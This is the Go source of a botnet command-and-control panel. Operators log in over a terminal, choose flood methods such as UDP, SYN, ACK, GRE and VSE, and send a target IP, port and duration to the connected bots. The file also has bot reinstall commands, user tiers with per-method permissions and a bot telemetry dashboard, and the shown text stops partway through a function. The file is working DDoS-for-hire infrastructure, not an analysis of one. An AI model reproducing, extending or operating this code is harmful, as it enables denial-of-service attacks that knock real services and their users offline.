package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
)

var (
	loader = anim{
		frames: []string{
			"[    ]", "[=   ]", "[==  ]", "[=== ]", "[====]", "[ ===]", "[  ==]", "[   =]",
			"[    ]", "[   =]", "[  ==]", "[ ===]", "[====]", "[=== ]", "[==  ]", "[=   ]",
			"[    ]", "[=   ]", "[==  ]", "[=== ]", "[====]", "[ ===]", "[  ==]", "[   =]",
			"[    ]", "[   =]", "[  ==]", "[ ===]", "[====]", "[=== ]", "[==  ]", "[=   ]",
		},
		delay: 100 * time.Millisecond,
	}
	ticker = anim{
		frames: []string{"[x]", "[+]", "[*]", "[✓]", "[✔]"},
		delay:  300 * time.Millisecond,
	}
	flasher = anim{
		frames: []string{"🔺", "🔻", "🔸", "🔹"},
		delay:  200 * time.Millisecond,
	}
)

func (a *anim) play(c net.Conn, dur time.Duration, msg string) {
	end := time.Now().Add(dur)
	idx := 0
	c.Write([]byte("\r\033[K\033[?25l"))
	for time.Now().Before(end) {
		c.Write([]byte(fmt.Sprintf("\r%s %s", a.frames[idx], msg)))
		time.Sleep(a.delay)
		idx = (idx + 1) % len(a.frames)
	}
	c.Write([]byte("\033[?25h"))
}

func (a *anim) playCentered(c net.Conn, dur time.Duration, msg string) {
	end := time.Now().Add(dur)
	idx := 0
	c.Write([]byte("\r\033[K\033[?25l"))
	for time.Now().Before(end) {
		full := fmt.Sprintf("%s %s", a.frames[idx], msg)
		pad := (80 - len(full)) / 2
		if pad < 0 {
			pad = 0
		}
		c.Write([]byte(fmt.Sprintf("\r%s%s", strings.Repeat(" ", pad), full)))
		time.Sleep(a.delay)
		idx = (idx + 1) % len(a.frames)
	}
	c.Write([]byte("\033[?25h"))
}

func errMsg(c net.Conn, msg string) {
	c.Write([]byte(fmt.Sprintf("\x1b[38;5;196m[!]\x1b[0m %s\r\n", msg)))
}

func okMsg(c net.Conn, msg string) {
	c.Write([]byte(fmt.Sprintf("\x1b[38;5;82m[+]\x1b[0m %s\r\n", msg)))
}

func prompt(c net.Conn, msg string) {
	c.Write([]byte(fmt.Sprintf("\x1b[38;5;226m%s\x1b[0m ", msg)))
}

func progressBar(c net.Conn, dur time.Duration, msg string) {
	start := time.Now()
	w := 20
	c.Write([]byte("\033[?25l"))
	for time.Now().Before(start.Add(dur)) {
		p := float64(time.Since(start)) / float64(dur)
		if p > 1 {
			p = 1
		}
		done := int(p * float64(w))
		if done > w {
			done = w
		}
		bar := strings.Repeat("█", done) + strings.Repeat("▒", w-done)
		c.Write([]byte(fmt.Sprintf("\r\033[K%s [%s] %.0f%%", msg, bar, p*100)))
		time.Sleep(100 * time.Millisecond)
	}
	c.Write([]byte(fmt.Sprintf("\r\033[K%s [%s] 100%%\n", msg, strings.Repeat("█", w))))
	c.Write([]byte("\033[?25h"))
}

func fadeText(text string, c net.Conn) {
	shades := []int{240, 245, 250, 255, 250, 245, 240}
	c.Write([]byte("\033[?25l"))
	for i := 0; i < 3; i++ {
		for _, s := range shades {
			c.Write([]byte(fmt.Sprintf("\r\033[K\033[38;5;%dm%s", s, text)))
			time.Sleep(50 * time.Millisecond)
		}
	}
	c.Write([]byte("\033[0m\033[?25h"))
}

func cls(c net.Conn) {
	c.Write([]byte("\033[2J\033[H\033[3J\033[H\033[2J\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
}

func readLine(c net.Conn) (string, error) {
	s, err := bufio.NewReader(c).ReadString('\n')
	if err != nil {
		return s, err
	}
	return strings.TrimRight(s, "\r\n"), nil
}

func playTFX(name string, c net.Conn) {
	fp := filepath.Join(gifsDir, filepath.Base(name))
	if !strings.HasSuffix(fp, ".tfx") {
		return
	}
	f, err := os.Open(fp)
	if err != nil {
		return
	}
	defer f.Close()
	c.Write([]byte("\033[2J\033[H\033[?25l"))
	sc := bufio.NewScanner(f)
	buf := make([]byte, 0, 4096)
	for sc.Scan() {
		line := strings.TrimRight(sc.Text(), "\r\n")
		if strings.Contains(line, "\033[") {
			buf = append(buf, line...)
			buf = append(buf, "\r\n"...)
			if len(buf) > 2048 {
				c.Write(buf)
				buf = buf[:0]
			}
		} else {
			if len(buf) > 0 {
				c.Write(buf)
				buf = buf[:0]
			}
			c.Write([]byte(line + "\r\n"))
		}
		time.Sleep(2 * time.Millisecond)
	}
	if len(buf) > 0 {
		c.Write(buf)
	}
	c.Write([]byte("\033[?25h\r\n\r\n"))
}

func listTFX(c net.Conn) {
	files, err := os.ReadDir(gifsDir)
	if err != nil {
		c.Write([]byte("no gifs dir\r\n"))
		return
	}
	var names []string
	for _, f := range files {
		if !f.IsDir() && strings.HasSuffix(f.Name(), ".tfx") {
			names = append(names, f.Name())
		}
	}
	if len(names) == 0 {
		c.Write([]byte("no .tfx files\r\n"))
		return
	}
	c.Write([]byte("\033[38;5;51mAvailable:\033[0m\r\n"))
	for i, n := range names {
		c.Write([]byte(fmt.Sprintf("  \033[38;5;214m%d.\033[0m %s\r\n", i+1, n)))
	}
}

// login flow
func doLogin(c net.Conn) (bool, *userConn) {
	clientIP := c.RemoteAddr().(*net.TCPAddr).IP.String()
	if !checkLoginRate(clientIP) {
		c.Write([]byte("\033[0;31m[!] locked out, try later\033[0m\r\n"))
		return false, nil
	}
	drawBanner := func() {
		c.Write([]byte("\033[2J\033[H"))
		gray := []int{232, 234, 236, 238, 240, 242, 244, 246, 248, 250, 252, 254, 255}
		art := []string{
			"╭══════════════════════════════════════════════════════════════════════════════╮",
			"║       ██████   ██████                    ███████████   ███                   ║",
			"║       ▒▒██████ ██████                    ▒▒███▒▒▒▒▒███ ▒▒▒                   ║",
			"║        ▒███▒█████▒███   ██████    ███████ ▒███    ▒███ ████   ██████         ║",
			"║        ▒███▒▒███ ▒███  ▒▒▒▒▒███  ███▒▒███ ▒██████████ ▒▒███  ███▒▒███        ║",
			"║        ▒███ ▒▒▒  ▒███   ███████ ▒███ ▒███ ▒███▒▒▒▒▒▒   ▒███ ▒███████         ║",
			"║        ▒███      ▒███  ███▒▒███ ▒███ ▒███ ▒███         ▒███ ▒███▒▒▒          ║",
			"║        ▒███      ▒███  ███▒▒███ ▒███ ▒███ ▒███         ▒███ ▒███▒▒▒          ║",
			"║        █████     █████▒▒████████▒▒███████ █████        █████▒▒██████         ║",
			"║       ▒▒▒▒▒     ▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒███▒▒▒▒▒        ▒▒▒▒▒  ▒▒▒▒▒▒          ║",
			"║                                 ███ ▒███                                     ║",
			"║                                ▒▒██████                                      ║",
			"║                                  ▒▒▒▒▒▒                                      ║",
			"╰══════════════════════════════════════════════════════════════════════════════╯",
		}
		for i, line := range art {
			clr := gray[i*len(gray)/len(art)]
			c.Write([]byte(fmt.Sprintf("\x1b[38;5;%dm%s\033[0m\n", clr, line)))
		}
	}
	drawBanner()

	for try := 0; try < 3; try++ {
		c.Write([]byte("\n"))
		c.Write([]byte("                       \033[38;5;109m► Auth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion --- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\033[0m\n"))
		c.Write([]byte("\033[38;5;245m                               ☉ Username\033[38;5;255m: \033[0m"))
		user, _ := readLine(c)
		c.Write([]byte("\033[38;5;245m                               ☉ Password\033[38;5;255m: \033[0m"))
		pass, _ := readLine(c)
		c.Write([]byte("\033[0m"))

		if ok, acct := authenticate(user, pass); ok {
			resetLoginTracker(clientIP)
			s, tok, err := openSession(*acct, clientIP, "terminal")
			if err != nil {
				errMsg(c, "session error: "+err.Error())
				continue
			}
			loader.playCentered(c, 2*time.Second, "Authenticating...\r")
			ticker.playCentered(c, 1*time.Second, "      Success!!!\r")
			playTFX("crow.tfx", c)
			cls(c)
			return true, &userConn{
				conn: c, token: tok, sid: s.ID,
				acct: account{
					Username: acct.Username, Password: acct.Password,
					Expire: acct.Expire, Level: acct.Level,
					APIToken: acct.APIToken, APISecret: acct.APISecret,
				},
			}
		}
		logAuthEvt(user, clientIP, false)
		left := 2 - try
		drawBanner()
		c.Write([]byte(fmt.Sprintf("\033[38;5;196m[!] Bad credentials. %d left.\033[0m\n\n", left)))
		if try == 2 {
			cls(c)
			c.Write([]byte("\033[0;31m[!] locked out\033[0m\n"))
			return false, nil
		}
	}
	c.Close()
	return false, nil
}

// help menu
func showHelp(c net.Conn) {
	cls(c)
	c.Write([]byte("\r\n"))
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮")
	w("\x1b[38;5;231m║                § \x1b[38;5;51mUser Menu\x1b[38;5;231m §                  ║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║")
	w("\x1b[38;5;231m╠════════════════════╦══════════════════════════╢  │    │    │    │    │    │  ║")
	w("\x1b[38;5;231m║   \x1b[38;5;41mBasic Commands   \x1b[38;5;231m║  \x1b[38;5;41mOverview + Description  \x1b[38;5;231m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║")
	w("\x1b[38;5;231m╠════════════════════╬══════════════════════════╬══════════════════════════════╣")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. bots          \x1b[38;5;231m║ Manage connected bots    ║ ╔══════════════════════════╗ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. clear         \x1b[38;5;231m║ Clear the screen         ║ ║ L7: HTTP/HTTPS/TLS/SSL   ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. help          \x1b[38;5;231m║ Show this help menu      ║ ║ L6: COMPRESSION/ENCRYPT  ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. methods       \x1b[38;5;231m║ Show attack methods      ║ ║ L5: SESSION/RPC/NETBIOS  ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. ongoing       \x1b[38;5;231m║ List ongoing attacks     ║ ║ L4: TCP/UDP/SCTP/PORTS   ║ ║")
	w("\x1b[38;5;231m╠════════════════════╩══════════════════════════╢ ║ L3: IP/ICMP/ARP/ROUTING  ║ ║")
	w("\x1b[38;5;231m║                § \x1b[38;5;51mAttack Menu\x1b[38;5;231m §                ║ ╚══════════════════════════╝ ║")
	w("\x1b[38;5;231m╠════════════════════╦══════════════════════════╬══════════════════════════════╢")
	w("\x1b[38;5;231m║\x1b[38;5;50m◉ Attack Commands ◉\x1b[38;5;231m ║  \x1b[38;5;50mOverview + Description  \x1b[38;5;231m║ ╔══════════════════════════╗ ║")
	w("\x1b[38;5;231m╠════════════════════╬══════════════════════════║ ║ [1][2][3][4][5][6][7][8] ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. allattacks    \x1b[38;5;231m║ Show all attacks         ║ ║  ●  ●  ○  ●  ○  ●  ○  ●  ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. stopattack    \x1b[38;5;231m║ Stop a running attack    ║ ║      24-PORT SWITCH      ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. attackhistory \x1b[38;5;231m║ View attack history      ║ ╚══════════════════════════╝ ║")
	w("\x1b[38;5;231m╠════════════════════╩═════════════════╦════════╩══════════════════════════════╣")
	w("\x1b[38;5;231m║  \x1b[38;5;45mEg.. !Method IP Port Duration ⚑ \x1b[38;5;231m    ║          ⚔ Attack Example ⚔           ║")
	w("\x1b[38;5;231m╰══════════════════════════════════════╩═══════════════════════════════════════╯")
}

// main command loop
func cmdLoop(c net.Conn, uc *userConn) {
	cls(c)
	c.Write([]byte("\r\n\r\n"))
	fadeText(fmt.Sprintf("\033[0mWelcome %s! Type 'help' for commands.", uc.acct.Username), c)
	c.Write([]byte("\r\n"))
	showHelp(c)

	for {
		c.Write([]byte("\n\r\033[38;5;146m[\033[38;5;161mPro\033[38;5;89mmpt\033[38;5;146m]\033[38;5;82m► \033[0m"))
		input, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			if err == io.EOF {
				return
			}
			c.Close()
			return
		}
		input = strings.TrimRight(input, "\r\n")
		parts := strings.Fields(input)
		if len(parts) == 0 {
			continue
		}
		cmd := strings.ToLower(parts[0])

		switch cmd {
		case "gif", "gifs":
			handleGif(parts, c)

		case "!udp", "!udpsmart", "!tcp", "!syn", "!ack", "!gre", "!vse", "!xmas", "!pps", "!stomp", "!amp", "!rst":
			handleAttack(parts, c, uc)

		case "ongoing":
			showOngoing(c, uc)

		case "allattacks":
			showAllAttacks(c)

		case "botstatus":
			showBotDashboard(c)

		case "stopattack":
			handleStop(c)

		case "attackhistory":
			showHistory(c)

		case "bots", "bot":
			showBots(c)

		case "clear":
			cls(c)
			c.Write([]byte("\r\n"))
			boxMsg(c, "Screen Cleared", "TERMINAL RESET", []string{"Status:    REFRESHED", "Action:    CLEARED", "Time:      " + time.Now().Format("15:04:05")})

		case "logout", "exit":
			cls(c)
			c.Write([]byte("\r\n\x1b[38;5;196mLogging out...\x1b[0m\r\nGoodbye!\r\n"))
			time.Sleep(1 * time.Second)
			c.Close()
			return

		case "help":
			showHelp(c)

		case "admin":
			if uc.acct.rank() > rankAdmin {
				errMsg(c, "no permission")
				continue
			}
			showAdmin(c)

		case "owner":
			if uc.acct.rank() > rankOwner {
				errMsg(c, "no permission")
				continue
			}
			showOwner(c)

		case "!reinstall":
			handleReinstall(c, uc)

		case "adduser":
			handleAddUser(c, uc)

		case "deluser":
			handleDelUser(c, uc)

		case "users":
			handleListUsers(c)

		case "methods", "?":
			showMethods(c)

		case "rbac":
			handleRBAC(parts, c, uc)

		default:
			c.Write([]byte("unknown command, type 'help'\n\r"))
		}
	}
}

// command handlers

func handleGif(parts []string, c net.Conn) {
	cls(c)
	if len(parts) < 2 {
		c.Write([]byte("\r\nUsage: gif list | gif <file>\r\n"))
		return
	}
	if strings.ToLower(parts[1]) == "list" {
		listTFX(c)
		return
	}
	name := parts[1]
	if !validateFilename(name) {
		if !strings.HasSuffix(name, ".tfx") {
			name += ".tfx"
		}
		if !validateFilename(name) {
			errMsg(c, "invalid filename")
			return
		}
	}
	if !strings.HasSuffix(name, ".tfx") {
		name += ".tfx"
	}
	playTFX(name, c)
}

func handleAttack(parts []string, c net.Conn, uc *userConn) {
	cls(c)
	if !uc.acct.allowed(parts[0]) {
		errMsg(c, "no permission for this method")
		return
	}
	if len(parts) < 4 {
		errMsg(c, "usage: method ip port duration")
		return
	}
	method, ip, port, durStr := parts[0], parts[1], parts[2], parts[3]
	if !validateIP(ip) {
		errMsg(c, "bad ip")
		logValidation(c.RemoteAddr().String(), "IP", ip)
		return
	}
	if !validatePort(port) {
		errMsg(c, "bad port")
		logValidation(c.RemoteAddr().String(), "PORT", port)
		return
	}
	dur, err := time.ParseDuration(durStr + "s")
	if err != nil || dur < 1*time.Second || dur > 3600*time.Second {
		errMsg(c, "bad duration (1-3600s)")
		logValidation(c.RemoteAddr().String(), "DUR", durStr)
		return
	}
	if ok, reason := canAttack(uc.acct.Username, dur); !ok {
		errMsg(c, reason)
		logQuotaHit(uc.acct.Username, "attack")
		return
	}
	flasher.play(c, 1*time.Second, "Launching...")
	c.Write([]byte("\r\n"))
	boxMsg(c, "Attack Launched", "ACTIVE",
		[]string{"Method:    " + method, "Target:    " + ip + ":" + port, "Duration:  " + durStr + "s"})

	a := attack{method: method, target: ip, port: port, dur: dur, started: time.Now(), who: uc.acct.Username}
	atkMu.Lock()
	liveAttacks[c] = a
	atkMu.Unlock()
	histMu.Lock()
	history = append(history, a)
	histMu.Unlock()
	go func(conn net.Conn, atk attack) {
		time.Sleep(atk.dur)
		atkMu.Lock()
		delete(liveAttacks, conn)
		atkMu.Unlock()
		ticker.play(conn, 1*time.Second, "Attack done!")
	}(c, a)

	var cmd cmdPayload
	copy(cmd.Method[:], method)
	ipb := net.ParseIP(ip).To4()
	if ipb != nil {
		copy(cmd.TargetIP[:], ipb)
	}
	portN, _ := strconv.Atoi(port)
	cmd.Port = uint16(portN)
	durN, _ := strconv.Atoi(durStr)
	cmd.Duration = uint32(durN)
	broadcast(cmd)
}

func showOngoing(c net.Conn, uc *userConn) {
	cls(c)
	c.Write([]byte("\r\n"))
	atkMu.Lock()
	a, ok := liveAttacks[c]
	if ok {
		rem := time.Until(a.started.Add(a.dur))
		if rem > 0 {
			boxMsg(c, "Attack Running", "IN PROGRESS",
				[]string{"Method:    " + a.method, "Target:    " + a.target + ":" + a.port,
					"Remaining: " + strconv.Itoa(int(rem.Seconds())) + "s",
					"Elapsed:   " + strconv.Itoa(int(time.Since(a.started).Seconds())) + "s"})
		} else {
			delete(liveAttacks, c)
			boxMsg(c, "Attack Done", "COMPLETED", []string{"Status: finished"})
		}
	} else {
		boxMsg(c, "No Active Attack", "IDLE", []string{"Nothing running"})
	}
	atkMu.Unlock()
}

func showAllAttacks(c net.Conn) {
	cls(c)
	c.Write([]byte("\r\n"))
	combined := allOngoing()
	if len(combined) == 0 {
		boxMsg(c, "No Attacks", "ALL IDLE", []string{"Everything quiet"})
		return
	}
	var lines []string
	for i, a := range combined {
		if i >= 5 {
			lines = append(lines, fmt.Sprintf("+ %d more ...", len(combined)-5))
			break
		}
		rem := time.Until(a.started.Add(a.dur))
		if rem > 0 {
			lines = append(lines, fmt.Sprintf("%d) %-8s → %s:%s  %ds left", i+1, a.method, a.target, a.port, int(rem.Seconds())))
		}
	}
	boxMsg(c, "Active Attacks", fmt.Sprintf("%d RUNNING", len(combined)), lines)
}

func handleStop(c net.Conn) {
	atkMu.Lock()
	if _, ok := liveAttacks[c]; ok {
		delete(liveAttacks, c)
		var stop cmdPayload
		copy(stop.Method[:], "STOP")
		broadcast(stop)
		atkMu.Unlock()
		cls(c)
		boxMsg(c, "Attack Stopped", "TERMINATED", []string{"Bots notified", "Time: " + time.Now().Format("15:04:05")})
	} else {
		atkMu.Unlock()
		errMsg(c, "no attack running")
	}
}

func showHistory(c net.Conn) {
	cls(c)
	c.Write([]byte("\r\n"))
	histMu.Lock()
	var lines []string
	for i, a := range history {
		lines = append(lines, fmt.Sprintf("%d) %-8s %-8s %s:%s %s", i+1, a.who, a.method, a.target, a.port, a.dur))
	}
	histMu.Unlock()
	if len(lines) == 0 {
		boxMsg(c, "Attack History", "EMPTY", []string{"No records"})
		return
	}
	display := lines
	if len(display) > 5 {
		display = display[:5]
		display = append(display, fmt.Sprintf("... %d more", len(lines)-5))
	}
	boxMsg(c, "Attack History", fmt.Sprintf("%d RECORDS", len(lines)), display)
}

func showBots(c net.Conn) {
	count := botCount()
	cls(c)
	c.Write([]byte("\r\n"))
	boxMsg(c, "Bot Network", "LIVE", []string{
		fmt.Sprintf("Connected: %d", count),
		"Status:    ACTIVE",
		"Updated:   " + time.Now().Format("15:04:05"),
	})
}

func showAdmin(c net.Conn) {
	cls(c)
	c.Write([]byte("\r\n"))
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮")
	w("\x1b[38;5;231m║                                 \x1b[38;5;51mAdmin Menu\x1b[38;5;231m                                   ║")
	w("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╣")
	w("\x1b[38;5;231m║   \x1b[38;5;45m1. adduser      \x1b[38;5;231m- Add a new user                                          ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m2. deluser      \x1b[38;5;231m- Delete a user                                           ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m3. users        \x1b[38;5;231m- List all users                                          ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m4. rbac         \x1b[38;5;231m- Manage permissions                                     ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m5. botstatus    \x1b[38;5;231m- Bot status details                                     ║")
	w("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯")
}

func showOwner(c net.Conn) {
	cls(c)
	c.Write([]byte("\r\n"))
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮")
	w("\x1b[38;5;231m║                               \x1b[38;5;51mOwner Panel\x1b[38;5;231m                                    ║")
	w("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╣")
	w("\x1b[38;5;231m║   \x1b[38;5;45m1. gif          \x1b[38;5;231m- Play animations                                        ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m2. deluser      \x1b[38;5;231m- Delete a user                                          ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m3. rbac         \x1b[38;5;231m- Manage permissions                                     ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m4. session      \x1b[38;5;231m- View/kill sessions                                     ║")
	w("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯")
}

func handleReinstall(c net.Conn, uc *userConn) {
	cls(c)
	if uc.acct.rank() > rankOwner {
		errMsg(c, "no permission")
		return
	}
	prompt(c, "Reinstall all bots? (yes/no):")
	ans, _ := readLine(c)
	if strings.ToLower(ans) != "yes" {
		errMsg(c, "cancelled")
		return
	}
	loader.play(c, 3*time.Second, "Reinstalling...")
	var cmd cmdPayload
	copy(cmd.Method[:], "!reinstall")
	broadcast(cmd)
	ticker.play(c, 1*time.Second, "Done!")
}

func handleAddUser(c net.Conn, uc *userConn) {
	if uc.acct.rank() > rankAdmin {
		errMsg(c, "no permission")
		return
	}
	prompt(c, "Username:")
	user, _ := readLine(c)
	prompt(c, "Password:")
	pass, _ := readLine(c)
	prompt(c, "Level (Owner/Admin/Pro/Basic):")
	level, _ := readLine(c)

	raw, err := os.ReadFile(usersPath)
	if err != nil {
		errMsg(c, "cant read users")
		return
	}
	var users []account
	json.Unmarshal(raw, &users)
	apiTok, apiSec, err := genAPICreds()
	if err != nil {
		errMsg(c, "keygen error")
		return
	}
	hpw, err := hashPw(pass)
	if err != nil {
		errMsg(c, "hash error")
		return
	}
	hsec, err := hashSecret(apiSec)
	if err != nil {
		errMsg(c, "hash error")
		return
	}
	users = append(users, account{
		Username: user, Password: hpw, Expire: time.Now().AddDate(1, 0, 0),
		Level: level, APIToken: apiTok, APISecret: hsec,
	})
	out, _ := json.MarshalIndent(users, "", "  ")
	if os.WriteFile(usersPath, out, 0600) != nil {
		errMsg(c, "write error")
		return
	}
	cls(c)
	boxMsg(c, "User Created", "SUCCESS", []string{
		"Username:  " + user, "Level:     " + level,
		"Expires:   " + time.Now().AddDate(1, 0, 0).Format("2006-01-02"),
		"API Token: " + apiTok, "API Secret:" + apiSec,
	})
}

func handleDelUser(c net.Conn, uc *userConn) {
	if uc.acct.rank() > rankAdmin {
		errMsg(c, "no permission")
		return
	}
	prompt(c, "Username to delete:")
	user, _ := readLine(c)
	raw, err := os.ReadFile(usersPath)
	if err != nil {
		errMsg(c, "cant read users")
		return
	}
	var users []account
	json.Unmarshal(raw, &users)
	found := false
	for i, u := range users {
		if u.Username == user {
			users = append(users[:i], users[i+1:]...)
			found = true
			break
		}
	}
	if !found {
		errMsg(c, "user not found: "+user)
		return
	}
	out, _ := json.MarshalIndent(users, "", "  ")
	if os.WriteFile(usersPath, out, 0600) != nil {
		errMsg(c, "write error")
		return
	}
	cls(c)
	boxMsg(c, "User Deleted", "REMOVED", []string{"Username: " + user, "Remaining: " + strconv.Itoa(len(users))})
}

func handleListUsers(c net.Conn) {
	raw, err := os.ReadFile(usersPath)
	if err != nil {
		errMsg(c, "cant read users")
		return
	}
	var users []account
	json.Unmarshal(raw, &users)
	cls(c)
	var lines []string
	for _, u := range users {
		lines = append(lines, fmt.Sprintf("%-12s %-8s exp:%s", u.Username, u.Level, u.Expire.Format("2006-01-02")))
	}
	boxMsg(c, "Users", fmt.Sprintf("%d TOTAL", len(users)), lines)
}

func showMethods(c net.Conn) {
	cls(c)
	c.Write([]byte("\r\n"))
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮")
	w("\x1b[38;5;231m║                § \x1b[38;5;51mAttack Methods\x1b[38;5;231m §             ║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║")
	w("\x1b[38;5;231m╠════════════════════╦══════════════════════════╬══════════════════════════════╣")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. !udpsmart     \x1b[38;5;231m║ Smart UDP Bypass         ║        LAYER 4               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. !udp          \x1b[38;5;231m║ UDP Flood                ║     TCP/UDP/SCTP              ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. !tcp          \x1b[38;5;231m║ TCP Flood                ║                               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. !syn          \x1b[38;5;231m║ SYN Flood                ║                               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. !ack          \x1b[38;5;231m║ ACK Flood                ║        LAYER 4+               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. !gre          \x1b[38;5;231m║ GRE Flood                ║     SPECIAL METHODS           ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. !vse          \x1b[38;5;231m║ Valve Source Engine       ║                               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. !xmas         \x1b[38;5;231m║ XMAS Flood               ║                               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. !pps          \x1b[38;5;231m║ PPS Bypass               ║                               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. !stomp        \x1b[38;5;231m║ TCP Stomp                ║                               ║")
	w("\x1b[38;5;231m╠════════════════════╩══════════════════════════╩══════════════════════════════╣")
	w("\x1b[38;5;231m║  \x1b[38;5;45mUsage: !method IP port duration\x1b[38;5;231m                                             ║")
	w("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯")
}

func handleRBAC(parts []string, c net.Conn, uc *userConn) {
	if uc.acct.rank() > rankAdmin {
		errMsg(c, "no permission")
		return
	}
	if len(parts) < 2 {
		perms := getPermissions()
		cls(c)
		c.Write([]byte("\r\n"))
		w := func(s string) { c.Write([]byte(s + "\n\r")) }
		w("\x1b[38;5;231m╭──────────────────────────────────────────────────────────────────────────────╮")
		w("\x1b[38;5;231m│                          \x1b[38;5;51mPermissions\x1b[38;5;231m                                         │")
		w("\x1b[38;5;231m├──────────────────────────────────────────────────────────────────────────────┤")
		methods := make([]string, 0, len(perms))
		for m := range perms {
			methods = append(methods, m)
		}
		sort.Strings(methods)
		for _, m := range methods {
			lvs := strings.Join(perms[m], ", ")
			if len(lvs) > 50 {
				lvs = lvs[:47] + "..."
			}
			w(fmt.Sprintf("\x1b[38;5;231m│ \x1b[38;5;45m%-15s \x1b[38;5;231m: \x1b[38;5;82m%-50s \x1b[38;5;231m│", m, lvs))
		}
		w("\x1b[38;5;231m├──────────────────────────────────────────────────────────────────────────────┤")
		w("\x1b[38;5;231m│              \x1b[38;5;51mrbac <method> get/set <levels...>\x1b[38;5;231m                              │")
		w("\x1b[38;5;231m╰──────────────────────────────────────────────────────────────────────────────╯")
		return
	}
	if len(parts) < 3 {
		errMsg(c, "usage: rbac <method> <set|get> [levels...]")
		return
	}
	method, action := parts[1], parts[2]
	switch action {
	case "get":
		perms := getPermissions()
		if lvs, ok := perms[method]; ok {
			c.Write([]byte(fmt.Sprintf("%s: %s\n\r", method, strings.Join(lvs, ", "))))
		} else {
			errMsg(c, "method not found: "+method)
		}
	case "set":
		if len(parts) < 4 {
			errMsg(c, "usage: rbac <method> set <level1> <level2> ...")
			return
		}
		levels := parts[3:]
		valid := allRoles()
		for _, l := range levels {
			found := false
			for _, v := range valid {
				if l == v {
					found = true
					break
				}
			}
			if !found {
				errMsg(c, fmt.Sprintf("bad level: %s (valid: %s)", l, strings.Join(valid, ", ")))
				return
			}
		}
		if err := setPermissions(method, levels); err != nil {
			errMsg(c, "error: "+err.Error())
		} else {
			okMsg(c, method+" updated")
		}
	default:
		errMsg(c, "use 'set' or 'get'")
	}
}

// bot telemetry dashboard
func showBotDashboard(c net.Conn) {
	cls(c)
	infos := activeBots()
	total := len(infos)
	diag := 0
	osCounts := make(map[string]int)
	for _, b := range infos {
		os := strings.TrimSpace(b.Sys.OS)
		if os != "" {
			diag++
			osCounts[os]++
		}
	}
	if total == 0 {
		boxMsg(c, "Bot Telemetry", "EMPTY", []string{fmt.Sprintf("Diagnosed: %d  OS types: %d", diag, len(osCounts)), "No bots reporting"})
		return
	}
	sort.Slice(infos, func(i, j int) bool { return infos[i].LastPing.After(infos[j].LastPing) })
	perPage := 5
	if perPage > total {
		perPage = total
	}
	pages := (total + perPage - 1) / perPage
	page := 0
	for {
		drawTelemetryPage(c, infos, page, perPage, pages, total, diag, len(osCounts))
		if pages <= 1 {
			break
		}
		c.Write([]byte("\x1b[38;5;51m[n]ext [p]rev [q]uit: \x1b[0m"))
		ch, err := readLine(c)
		if err != nil {
			break
		}
		switch strings.TrimSpace(strings.ToLower(ch)) {
		case "n", "next":
			if page+1 < pages {
				page++
			}
		case "p", "prev":
			if page > 0 {
				page--
			}
		case "", "q", "quit":
			return
		}
	}
}

func drawTelemetryPage(c net.Conn, infos []botEntry, page, perPage, pages, total, diag, uniqOS int) {
	c.Write([]byte("\033[H\033[2J\r\n"))
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮")
	dashLine(c, "   Bot Telemetry Dashboard")
	w("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╣")
	dashLine(c, fmt.Sprintf("   Bots: %-5d  Diag: %-5d  OS: %-5d", total, diag, uniqOS))
	w("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╣")
